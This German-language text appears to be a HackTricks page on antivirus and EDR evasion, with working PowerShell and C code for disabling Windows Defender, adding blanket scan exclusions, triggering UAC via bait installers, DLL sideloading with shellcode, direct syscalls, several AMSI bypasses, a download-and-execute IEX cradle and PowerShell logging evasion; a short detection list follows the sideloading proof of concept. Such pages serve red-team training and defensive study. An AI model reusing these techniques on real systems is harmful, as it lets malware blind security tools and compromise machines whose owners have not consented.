# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!** **verfasst.**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender am Funktionieren zu hindern.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender mithilfe eines gefälschten anderen AV stoppt.
- [Defender deaktivieren, wenn Sie Admin sind](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentliche Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert. Sie **fordern den Benutzer zunächst zur Erhöhung der Rechte auf** und setzen erst danach Defender außer Kraft. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der Aufrufer Admin-Rechte hat. Ein Fehlschlag bedeutet also, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` erneut starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren daher normalerweise die Eingabeaufforderung. Dadurch erhält die Malware die Berechtigungen, die sie benötigt, um die Richtlinien von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-artige Ketten die blinden Flecken von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und legt dann **extrem weitreichende Ausnahmen** fest, sodass Benutzerprofile, Systemverzeichnisse und Wechseldatenträger nicht mehr gescannt werden können:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **zukünftige Payloads, die irgendwo auf dem Datenträger abgelegt werden, ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist vorausschauend – Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anfassen zu müssen.
- Alle Änderungen werden unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gespeichert. So können spätere Phasen bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden einfache Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitüberprüfung diese Pfade nie scannt.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte bösartige Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript erkannt. Außerdem werden Informationen aus der Datei selbst ausgelesen (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass ihr leichter entdeckt werdet, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn ihr die Binärdatei verschlüsselt, kann AV euer Programm nicht erkennen. Ihr benötigt dann allerdings eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuskation**

Manchmal reicht es, einige Zeichenfolgen in eurer Binärdatei oder eurem Skript zu ändern, damit AV sie nicht mehr erkennt. Je nachdem, was ihr obfuskieren möchtet, kann das jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn ihr eigene Tools entwickelt, gibt es keine bekannten schädlichen Signaturen. Das kostet allerdings viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool unterteilt die Datei in mehrere Abschnitte und lässt Defender jeden einzeln scannen. So kann es euch genau zeigen, welche Zeichenfolgen oder Bytes in eurer Binärdatei markiert werden.

Ich empfehle euch dringend, euch diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt AV eure Binärdatei in einer Sandbox aus und überwacht sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter eures Browsers zu entschlüsseln und auszulesen oder einen Minidump von LSASS zu erstellen). Dieser Bereich kann etwas schwieriger sein, aber es gibt einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse durch AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Arbeitsablauf des Benutzers nicht unterbrochen wird. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Ressourcen des Computers prüfen** Sandboxes verfügen normalerweise nur über wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Hier könnt ihr auch kreativ werden, indem ihr beispielsweise die CPU-Temperatur oder sogar die Lüfterdrehzahl prüft – nicht alles wird in der Sandbox implementiert sein.
- **Computerspezifische Prüfungen** Wenn ihr einen Benutzer angreifen möchtet, dessen Workstation der Domäne „contoso.local“ angehört, könnt ihr die Domäne des Computers überprüfen. Stimmt sie nicht mit der von euch angegebenen überein, könnt ihr euer Programm beenden.

Wie sich herausstellt, lautet der Computername der Microsoft Defender Sandbox HAL9TH. Ihr könnt also vor der Detonation in eurer Malware den Computernamen prüfen. Lautet er HAL9TH, befindet ihr euch in der Defender-Sandbox und könnt euer Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgehen von Sandboxes:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits in diesem Beitrag erwähnt, werden **öffentliche Tools** früher oder später **erkannt**. Ihr solltet euch also eine Frage stellen:

Wenn ihr beispielsweise LSASS dumpen möchtet, **müsst ihr wirklich mimikatz verwenden**? Oder könntet ihr ein anderes, weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann?

Wahrscheinlich ist Letzteres die richtige Antwort. Am Beispiel von mimikatz: Es ist vermutlich eine der am häufigsten – wenn nicht die am häufigsten – von AVs und EDRs markierten Malware. Das Projekt selbst ist zwar großartig, aber es ist auch ein Albtraum, damit AV zu umgehen. Sucht also einfach nach Alternativen, mit denen ihr euer Ziel erreichen könnt.

> [!TIP]
> Wenn ihr eure Payloads zur Evasion verändert, solltet ihr **die automatische Übermittlung von Beispielen** in Defender deaktivieren. Und bitte, wirklich: **LADet NICHTS AUF VIRUSTOTAL HOCH**, wenn ihr langfristig Evasion erreichen möchtet. Wenn ihr prüfen wollt, ob eine bestimmte AV eure Payload erkennt, installiert es in einer VM, versucht die automatische Übermittlung von Beispielen zu deaktivieren und testet es dort, bis ihr mit dem Ergebnis zufrieden seid.

## EXEs vs DLLs

Wann immer möglich, solltet ihr für Evasion immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. In manchen Fällen ist das also ein sehr einfacher Trick, um einer Erkennung zu entgehen (vorausgesetzt natürlich, eure Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me zwischen einer normalen Havoc-EXE-Payload und einer normalen Havoc-DLL</p></figcaption></figure>

Im Folgenden zeigen wir einige Tricks, mit denen ihr DLL-Dateien deutlich unauffälliger einsetzen könnt.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die bösartigen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript könnt ihr nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in "C:\Program Files\\" aus, die für DLL Hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu erkunden**. Wird diese Technik richtig eingesetzt, ist sie ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, kannst du leicht erwischt werden.

Wenn du einfach eine schädliche DLL mit dem Namen platzierst, den ein Programm zu laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm macht, von der Proxy-DLL (der schädlichen DLL) an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Dies sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) encodiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Detection rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir das [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie auch [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über die besprochenen Themen zu erfahren.

### Weitergeleitete Exports missbrauchen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Anstatt auf Code zu verweisen, enthält der Export-Eintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader folgende Schritte aus:

- `TargetDll` laden, falls sie noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Dies ermöglicht eine indirekte Sideloading-Methode: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Modul weitergeleitet wird, dessen Name keine KnownDLL ist. Lege dann diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL ab, die exakt den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel aus einer Beobachtung unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopieren Sie die signierte System-DLL in einen beschreibbaren Ordner.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um code execution zu erhalten; du musst die weitergeleitete Funktion nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Löse den Forward mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, wird der Fehler „fehlende API“ erst angezeigt, nachdem `DllMain` bereits ausgeführt wurde

Tipps zur Suche:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Weitergeleitete Exports kannst du mit Tools wie diesem aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Bei Prozess-/Modulketten wie `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden Alarm auslösen
- Richtlinien zur Codeintegrität (WDAC/AppLocker) durchsetzen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe angehaltener Prozesse, direkter Syscalls und alternativer Ausführungsmethoden`

Mit Freeze kannst du deinen Shellcode unauffällig laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlass dich daher nie auf nur ein Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu kombinieren.

## Direct/Indirect Syscalls & SSN-Auflösung (SysWhispers4)

EDRs setzen häufig **User-Mode-Inline-Hooks** auf Syscall-Stubs in `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die richtige **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Anweisung in den generierten Stub einfügen (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Zu einem vorhandenen `syscall`-Gadget in `ntdll` springen, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Die statische Opcode-Sequenz `0F 05` nicht auf der Festplatte einbetten; stattdessen zur Laufzeit eine Syscall-Sequenz auflösen.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs durch Sortieren der Syscall-Stubs nach virtueller Adresse ableiten, statt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus ihrer `.text` lesen und sie anschließend wieder entmappen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Die Ableitung von SSNs anhand der VA-Sortierung mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf die VA-Ableitung zurückgreifen.
- **HW Breakpoint**: DR0 auf die `syscall`-Anweisung setzen und eine VEH verwenden, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn es dir also irgendwie gelang, Payloads **direkt im Arbeitsspeicher** auszuführen, konnte das AV nichts dagegen tun, da es nicht genügend Einblick hatte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung von EXE, COM, MSI oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Dadurch können Antivirenlösungen das Verhalten von Skripten untersuchen, indem der Skriptinhalt unverschlüsselt und unverschleiert bereitgestellt wird.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst in Windows Defender den folgenden Alarm aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad der ausführbaren Datei, über die das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem durch AMSI im Arbeitsspeicher erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geprüft. Das betrifft auch `Assembly.Load(byte[])`, mit dem Code im Arbeitsspeicher ausgeführt wird. Deshalb werden für die Ausführung im Arbeitsspeicher niedrigere .NET-Versionen (wie 4.7.2 oder älter) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungsverfahren arbeitet, kann es eine gute Möglichkeit sein, die Skripte, die du laden möchtest, zu verändern, um einer Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsschichten enthalten. Je nach Vorgehensweise kann Obfuscation daher eine schlechte Option sein. Dadurch ist das Umgehen nicht ganz einfach. Manchmal reicht es allerdings, ein paar Variablennamen zu ändern. Es kommt also darauf an, wie stark etwas bereits als verdächtig markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den PowerShell-Prozess (sowie in cscript.exe, wscript.exe usw.) geladen wird, lässt sich AMSI leicht manipulieren – sogar als nicht privilegierter Benutzer. Aufgrund dieses Implementierungsfehlers haben Forschende mehrere Möglichkeiten gefunden, den AMSI-Scan zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher muss sie modifiziert werden, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI bypass, den ich diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Behalte im Hinterkopf, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Wenn du also unerkannt bleiben willst, solltest du keinen Code veröffentlichen.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll (die für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig ist) ermittelt und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele weitere Techniken, um AMSI mit powershell zu umgehen. Weitere Informationen findest du auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn es sich bei dem angeforderten Modul um `amsi.dll` handelt. Dadurch wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notizen
- Funktioniert mit PowerShell, WScript/CScript und benutzerdefinierten Loadern gleichermaßen (also allem, was andernfalls AMSI laden würde).
- Kombinieren Sie dies mit dem Übergeben von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Befehlszeilen-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen vermeiden, indem sie zufällige benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke verwenden sowie die Groß- und Kleinschreibung von PowerShell-Schlüsselwörtern zufällig variieren.

**Die erkannte Signatur entfernen**

Sie können Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, finden Sie unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen. Daher können Sie Ihre Skripte ausführen, ohne dass sie von AMSI überprüft werden. So geht's:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Dazu kannst du beispielsweise ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen. Daher kannst du deine Skripte ausführen, ohne dass sie von AMSI gescannt werden. So geht's: `powershell.exe -version 2`
- **Eine unmanaged PowerShell session verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Abwehrmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Runtime und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Bei mehreren Obfuscation-Techniken werden Daten verschlüsselt, wodurch sich die Entropie der Binary erhöht und AVs und EDRs sie leichter erkennen können. Sei vorsichtig und wende Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### ConfuserEx-Protected .NET Binaries deobfuscieren

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu originales IL wieder her**, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

